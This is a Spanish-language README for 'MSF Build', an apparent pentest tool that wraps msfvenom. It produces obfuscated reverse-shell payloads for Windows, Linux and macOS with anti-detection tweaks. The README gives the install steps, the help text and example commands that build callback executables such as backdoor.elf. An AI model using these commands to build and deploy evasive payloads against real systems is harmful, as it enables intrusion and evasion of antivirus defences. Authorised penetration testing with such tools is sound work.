# 🛠️ MSF Build - Advanced Payload Generator

*Herramienta profesional para generar payloads ofuscados utilizando el codificador Shikata Ga Nai*

![msfbuild](https://github.com/user-attachments/assets/d617ca7f-50f8-46b3-be4b-6ed0567277c0)

## 📜 Descripción
**MSF Build** es una herramienta CLI para generar payloads ofuscados multiplataforma con medidas anti-detección integradas. Utiliza `msfvenom` bajo el capó y está diseñado para pruebas de penetración éticas.

## ✨ Características
- ✅ Soporte para **Windows**, **Linux** y **macOS**
- 🔄 Ofuscación con **Shikata Ga Nai** (x86)
- 🛡️ Medidas básicas anti-detección (modificación de metadatos)
- 🎨 Interfaz colorida con animaciones
- 🧩 Generación de payloads en múltiples formatos: `exe`, `elf`, `macho`, `python`

## 🚀 Instalación

### Requisitos:
- Python 3.6+
- Metasploit Framework (`msfvenom`)
- Terminal con soporte ANSI

```
# Instalar dependencias
pip install colorama
sudo apt install metasploit-framework  # Para sistemas Debian/Ubuntu

# Clonar repositorio
git clone https://github.com/afsh4ck/MSF-Build.git
cd MSF-Build
```

## 🖥️ Uso

Menú de Ayuda:
```
python3 msfbuild.py -h                                                                                  
    __  ___ _____  ______   ____          _  __     __
   /  |/  // ___/ / ____/  / __ ) __  __ (_)/ /____/ /
  / /|_/ / \__ \ / /_     / __  |/ / / // // // __  / 
 / /  / / ___/ // __/    / /_/ // /_/ // // // /_/ /  
/_/  /_/ /____//_/      /_____/ \__,_//_//_/ \__,_/   
-------------------------------------------------------
     Msfvenom advanced obfuscated payload generator    
-------------------------------------------------------
                 Developed by: @afsh4ck                

usage: python3 msfbuild.py --os <OS> --arch <ARCH> --type <TYPE> --lhost <IP> --lport <PORT> -o <OUTPUT> [-i ITERATIONS]

options:
  --os {windows,linux,macos}               Sistema operativo objetivo
  --arch {x86,x64}                         Arquitectura objetivo
  --type {exe,elf,macho,python}            Tipo de archivo de salida
  --lhost LHOST                            Dirección IP para conexión reversa
  --lport LPORT                            Puerto para conexión reversa
  -o OUTPUT, --output OUTPUT               Nombre del archivo de salida
  -i ITERATIONS, --iterations ITERATIONS   Iteraciones de ofuscación (solo x86)
  -h, --help                               Mostrar este mensaje de ayuda
```

## 💻 Ejemplos

### Generar payload para Windows x86:
```
python3 msfbuild.py \
  --os windows \
  --arch x86 \
  --type exe \
  --lhost 192.168.1.100 \
  --lport 4444 \
  -o payload.exe \
  -i 10
```
### Generar payload para Linux x64:
```
python3 msfbuild.py \
  --os linux \
  --arch x64 \
  --type elf \
  --lhost 10.0.0.5 \
  --lport 8080 \
  -o backdoor.elf
```
### Generar payload para macOS:
```
python3 msfbuild.py \
  --os macos \
  --arch x64 \
  --type macho \
  --lhost 172.16.23.45 \
  --lport 6500 \
  -o mac_payload
```

## 🛡️ Medidas de Seguridad

- Modificación de timestamps en archivos .exe
- Advertencias automáticas para configuraciones incompatibles
- Validación estricta de parámetros de entrada

## ⚠️ Disclaimer

Este software está diseñado exclusivamente para:
- Pruebas de seguridad autorizadas
- Investigación en entornos controlados
- Educación en ciberseguridad

El uso malicioso de esta herramienta es estrictamente prohibido. 
El autor no se hace responsable del uso indebido.

## 🤝 Contribuir
- Haz fork del proyecto
- Crea una rama (git checkout -b feature/nueva-funcionalidad)
- Haz commit de tus cambios (git commit -am 'Añadir funcionalidad X')
- Push a la rama (git push origin feature/nueva-funcionalidad)
- Abre un Pull Request

### Creado con ❤️ por @afsh4ck 
